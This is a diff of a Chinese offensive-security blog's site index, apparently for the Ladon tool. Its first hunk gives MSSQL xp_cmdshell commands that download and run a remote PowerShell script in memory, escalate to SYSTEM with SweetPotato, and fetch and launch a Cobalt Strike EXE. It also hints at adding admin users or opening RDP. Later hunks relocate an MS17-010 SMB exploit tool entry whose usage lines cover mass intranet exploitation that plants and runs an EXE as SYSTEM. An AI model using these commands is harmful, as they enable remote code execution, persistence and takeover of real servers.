@@ -1230,13 +1230,18 @@ window.location.href="http://k8gege.org/Ladon/win2016_lpe_potato_bypass.html";
 <h3 id="Ladon本地用户权限提权"><a href="#Ladon本地用户权限提权" class="headerlink" title="Ladon本地用户权限提权"></a>Ladon本地用户权限提权</h3><p>网上找了些LPE，发现直接被Defender杀，病毒库更新至2021.1.19，Ladon没被杀，管理员UAC权限可通过BypassUac提权<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/exp/lpe/win2016_user_lpe.png"></p>
 <h3 id="MSSQL远程加载Ladon提权"><a href="#MSSQL远程加载Ladon提权" class="headerlink" title="MSSQL远程加载Ladon提权"></a>MSSQL远程加载Ladon提权</h3><p>执行SQL查询权限为network service</p>
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/exp/lpe/sql2016_whoami.png"></p>
-<h4 id="远程内存加载PowerLadon提权"><a href="#远程内存加载PowerLadon提权" class="headerlink" title="远程内存加载PowerLadon提权"></a>远程内存加载PowerLadon提权</h4><p>exec master..xp_cmdshell ‘powershell “IEX (New-Object Net.WebClient).DownloadString(‘’<a href="http://xxxxxx.800/Ladon.ps1&#39;&#39;" target="_blank" rel="noopener">http://xxxxxx.800/Ladon.ps1&#39;&#39;</a>); Ladon SweetPotato “whoami””‘</p>
+<h4 id="远程内存加载PowerLadon提权"><a href="#远程内存加载PowerLadon提权" class="headerlink" title="远程内存加载PowerLadon提权"></a>远程内存加载PowerLadon提权</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'powershell "IEX (New-Object Net.WebClient).DownloadString('</span><span class="string">'http://xxxxxx.800/Ladon.ps1'</span><span class="string">'); Ladon SweetPotato "whoami""'</span></span><br></pre></td></tr></table></figure>
+
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/exp/lpe/win2016_mssql2016.png"></p>
-<h4 id="ECHO写入BAT执行多行命令提权"><a href="#ECHO写入BAT执行多行命令提权" class="headerlink" title="ECHO写入BAT执行多行命令提权"></a>ECHO写入BAT执行多行命令提权</h4><p>exec master..xp_cmdshell ‘echo whoami &gt; c:\users\public\test.bat’</p>
+<h4 id="ECHO写入BAT执行多行命令提权"><a href="#ECHO写入BAT执行多行命令提权" class="headerlink" title="ECHO写入BAT执行多行命令提权"></a>ECHO写入BAT执行多行命令提权</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'echo whoami &gt; c:\users\public\test.bat'</span></span><br></pre></td></tr></table></figure>
+
 <p>可ECHO写入添加管理员用户命令或者开3389等操作（举一反三不要只懂WHOAMI）</p>
-<h4 id="使用SYSTEM权限执行BAT"><a href="#使用SYSTEM权限执行BAT" class="headerlink" title="使用SYSTEM权限执行BAT"></a>使用SYSTEM权限执行BAT</h4><p>exec master..xp_cmdshell ‘powershell “IEX (New-Object Net.WebClient).DownloadString(‘’<a href="http://xxxx:800/Ladon.ps1&#39;&#39;" target="_blank" rel="noopener">http://xxxx:800/Ladon.ps1&#39;&#39;</a>); Ladon SweetPotato “c:\users\public\test.bat””‘</p>
-<h4 id="Wget下载Coblat-Strkie的EXE"><a href="#Wget下载Coblat-Strkie的EXE" class="headerlink" title="Wget下载Coblat Strkie的EXE"></a>Wget下载Coblat Strkie的EXE</h4><p>exec master..xp_cmdshell ‘powershell “IEX (New-Object Net.WebClient).DownloadString(‘’<a href="http://xxxx:800/Ladon.ps1&#39;&#39;" target="_blank" rel="noopener">http://xxxx:800/Ladon.ps1&#39;&#39;</a>); Ladon wget <a href="http://k8gege.org/cs.exe&quot;&#39;">http://k8gege.org/cs.exe&quot;&#39;</a></p>
-<h4 id="使用SYSTEM权限执行CS"><a href="#使用SYSTEM权限执行CS" class="headerlink" title="使用SYSTEM权限执行CS"></a>使用SYSTEM权限执行CS</h4><p>exec master..xp_cmdshell ‘powershell “IEX (New-Object Net.WebClient).DownloadString(‘’<a href="http://xxxx:800/Ladon.ps1&#39;&#39;" target="_blank" rel="noopener">http://xxxx:800/Ladon.ps1&#39;&#39;</a>); Ladon SweetPotato “c:\users\public\cs.exe””‘</p>
+<h4 id="使用SYSTEM权限执行BAT"><a href="#使用SYSTEM权限执行BAT" class="headerlink" title="使用SYSTEM权限执行BAT"></a>使用SYSTEM权限执行BAT</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'powershell "IEX (New-Object Net.WebClient).DownloadString('</span><span class="string">'http://xxxx:800/Ladon.ps1'</span><span class="string">'); Ladon SweetPotato "c:\users\public\test.bat""'</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Wget下载Coblat-Strkie的EXE"><a href="#Wget下载Coblat-Strkie的EXE" class="headerlink" title="Wget下载Coblat Strkie的EXE"></a>Wget下载Coblat Strkie的EXE</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'powershell "IEX (New-Object Net.WebClient).DownloadString('</span><span class="string">'http://xxxx:800/Ladon.ps1'</span><span class="string">'); Ladon wget http://k8gege.org/cs.exe"'</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="使用SYSTEM权限执行CS"><a href="#使用SYSTEM权限执行CS" class="headerlink" title="使用SYSTEM权限执行CS"></a>使用SYSTEM权限执行CS</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'powershell "IEX (New-Object Net.WebClient).DownloadString('</span><span class="string">'http://xxxx:800/Ladon.ps1'</span><span class="string">'); Ladon SweetPotato "c:\users\public\cs.exe""'</span></span><br></pre></td></tr></table></figure>
+
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
 <img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
@@ -4803,33 +4808,6 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       </tags>
   </entry>
   <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>MS17010</tag>
-        <tag>SMB</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
     <url>/p/e896a7d1.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
@@ -4926,6 +4904,33 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>MS17010</tag>
+        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
